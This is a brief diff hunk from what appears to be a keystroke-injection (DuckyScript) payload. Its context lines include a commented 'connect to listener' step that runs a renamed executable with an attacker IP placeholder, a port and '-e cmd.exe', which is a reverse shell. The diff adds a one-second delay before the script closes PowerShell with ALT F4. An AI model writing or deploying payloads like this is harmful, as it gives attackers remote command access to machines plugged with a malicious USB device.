@@ -35,5 +35,6 @@ REM Connect to listener
 REM STRING ./4323.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
 
+DELAY 1000
 REM Exit Powershell
 ALT F4
